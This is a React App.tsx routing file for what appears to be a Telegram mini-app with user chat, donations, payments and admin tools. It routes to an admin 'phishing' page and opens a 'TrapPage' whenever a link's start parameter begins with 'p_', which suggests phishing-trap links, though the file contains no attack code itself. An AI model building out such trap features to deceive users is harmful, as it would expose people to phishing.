import { useState, useEffect } from "react";
import { Switch, Route, Router as WouterRouter, Redirect } from "wouter";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/not-found";

// Providers & Guards
import { TelegramProvider, useTelegram, useApiAuth } from "@/lib/telegram-context";
import { AuthGuard } from "@/pages/auth-guard";

// Cookie consent
import { CookieBanner } from "@/components/CookieBanner";

// User Pages
import { UserChat }       from "@/pages/user/chat";
import { DonatePage }     from "@/pages/user/donate";
import { UserSessionPage } from "@/pages/user/session";
import { UserAccount }    from "@/pages/user/account";

// Admin Pages
import { AdminInbox }            from "@/pages/admin/inbox";
import { AdminChat }             from "@/pages/admin/chat";
import { AdminBroadcast }        from "@/pages/admin/broadcast";
import { AdminDonations }        from "@/pages/admin/donations";
import { AdminUsers }            from "@/pages/admin/users";
import { AdminModeration }       from "@/pages/admin/moderation";
import { AdminBotTools }         from "@/pages/admin/bot-tools";
import { AdminSessions }         from "@/pages/admin/sessions";
import { AdminDeletionRequests } from "@/pages/admin/deletion-requests";
import { AdminPlans }            from "@/pages/admin/plans";
import { AdminPayments }         from "@/pages/admin/payments";

// Shared Pages (admin + premium users)
import { GroupTools } from "@/pages/group-tools";
import { UserLiveChat } from "@/pages/user/live-chat";
import { AdminLiveChat } from "@/pages/admin/live-chat";
import { AdminPhishing } from "@/pages/admin/phishing";
import { TrapPage } from "@/pages/trap";
import { UserPayments } from "@/pages/user/payments";
import { WidgetSettings } from "@/pages/user/widget-settings";
import { WidgetInbox } from "@/pages/user/widget-inbox";
import { AdminWidgetManager } from "@/pages/admin/widget-admin";
import { AiChat } from "@/pages/user/ai-chat";
import { AiAdmin } from "@/pages/admin/ai-admin";

import { API_BASE } from "@/lib/api";
import { setApiBase } from "@workspace/api-client-react";

setApiBase(API_BASE);

const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      retry: 1,
      refetchOnWindowFocus: false,
    },
  },
});

function AppRoutes() {
  const { profile } = useTelegram();
  const isAdmin = profile?.is_admin === true;

  if (isAdmin) {
    return (
      <Switch>
        <Route path="/admin"                   component={AdminInbox} />
        <Route path="/admin/chat/:userId"      component={AdminChat} />
        <Route path="/admin/broadcast"         component={AdminBroadcast} />
        <Route path="/admin/donations"         component={AdminDonations} />
        <Route path="/admin/users"             component={AdminUsers} />
        <Route path="/admin/moderation"        component={AdminModeration} />
        <Route path="/admin/bot-tools"         component={AdminBotTools} />
        <Route path="/admin/sessions"          component={AdminSessions} />
        <Route path="/admin/deletion-requests" component={AdminDeletionRequests} />
        <Route path="/admin/plans"             component={AdminPlans} />
        <Route path="/admin/payments"          component={AdminPayments} />
        <Route path="/admin/group-tools"       component={GroupTools} />
        <Route path="/admin/live-chat"         component={AdminLiveChat} />
        <Route path="/admin/phishing"          component={AdminPhishing} />
        <Route path="/admin/widget-settings"   component={WidgetSettings} />
        <Route path="/admin/widget-inbox"      component={WidgetInbox} />
        <Route path="/admin/widget-admin"      component={AdminWidgetManager} />
        <Route path="/admin/ai-chat"          component={AiChat} />
        <Route path="/admin/ai-admin"         component={AiAdmin} />
        <Route path="/">
          <Redirect to="/admin" />
        </Route>
        <Route component={NotFound} />
      </Switch>
    );
  }

  return (
    <Switch>
      <Route path="/"            component={UserChat} />
      <Route path="/donate"      component={DonatePage} />
      <Route path="/session"     component={UserSessionPage} />
      <Route path="/account"     component={UserAccount} />
      <Route path="/payments"    component={UserPayments} />
      <Route path="/group-tools" component={GroupTools} />
      <Route path="/live-chat"          component={UserLiveChat} />
      <Route path="/widget-settings"   component={WidgetSettings} />
      <Route path="/widget-inbox"      component={WidgetInbox} />
      <Route path="/ai-chat"          component={AiChat} />
      <Route path="/admin/*">
        <Redirect to="/" />
      </Route>
      <Route component={NotFound} />
    </Switch>
  );
}

function getStartParam(): string | null {
  try {
    const tg = (window as any).Telegram?.WebApp;
    const sp = tg?.initDataUnsafe?.start_param;
    if (sp && typeof sp === "string" && sp.startsWith("p_")) return sp.slice(2);
  } catch {}
  return null;
}

function AppInner() {
  const { profile } = useTelegram();
  const { headers: authHeaders } = useApiAuth() as { headers: Record<string, string> };
  const telegramId  = profile?.telegram_id;

  const trapCode = getStartParam();
  if (trapCode) {
    return <TrapPage code={trapCode} />;
  }

  return (
    <>
      <WouterRouter base={import.meta.env.BASE_URL.replace(/\/$/, "")}>
        <AppRoutes />
      </WouterRouter>
      {!profile?.is_admin && (
        <CookieBanner telegramId={telegramId} apiBase={API_BASE} authHeaders={authHeaders} />
      )}
    </>
  );
}

const BETA_KEY = "lg_beta_dismissed_v2.9.7";

function BetaWarning({ onContinue }: { onContinue: () => void }) {
  return (
    <div className="fixed inset-0 z-[9999] bg-background flex items-center justify-center p-6">
      <div className="max-w-sm w-full text-center space-y-5">
        <div className="text-5xl">⚠️</div>
        <h2 className="text-lg font-bold tracking-tight">Beta Version</h2>
        <div className="space-y-3 text-sm text-muted-foreground leading-relaxed">
          <p>
            This app is still in <span className="text-foreground font-medium">beta testing</span>. Some features may be incomplete, unstable, or behave unexpectedly.
          </p>
          <p>
            We're actively developing and improving things. You may encounter bugs, UI glitches, or temporary downtime during updates.
          </p>
          <p className="text-xs text-muted-foreground/60">
            By continuing, you acknowledge that this is an early access version and data or functionality may change without notice.
          </p>
        </div>
        <button
          onClick={onContinue}
          className="w-full py-2.5 px-4 bg-foreground text-background rounded-xl text-sm font-semibold hover:opacity-90 transition-opacity"
        >
          I Understand, Continue
        </button>
        <p className="text-[10px] text-muted-foreground/40">v2.9.7 — Beta</p>
      </div>
    </div>
  );
}

function App() {
  const [showBeta, setShowBeta] = useState(() => {
    try { return !localStorage.getItem(BETA_KEY); } catch { return true; }
  });

  const dismissBeta = () => {
    try { localStorage.setItem(BETA_KEY, "1"); } catch {}
    setShowBeta(false);
  };

  if (showBeta) return <BetaWarning onContinue={dismissBeta} />;

  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <TelegramProvider>
          <AuthGuard>
            <AppInner />
          </AuthGuard>
        </TelegramProvider>
        <Toaster />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
